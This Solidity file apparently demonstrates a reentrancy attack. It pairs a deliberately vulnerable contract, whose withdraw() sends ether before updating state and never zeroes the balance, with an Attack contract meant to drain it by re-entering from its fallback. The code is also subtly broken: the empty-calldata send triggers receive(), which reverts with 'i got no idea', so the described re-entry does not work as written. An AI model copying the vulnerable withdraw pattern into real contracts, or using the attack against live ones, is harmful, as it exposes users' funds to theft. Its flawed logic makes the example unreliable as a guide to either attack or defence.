// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send ether ");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
    }

    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();
        }
    }

    receive() external payable {
        revert("i got no idea");
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
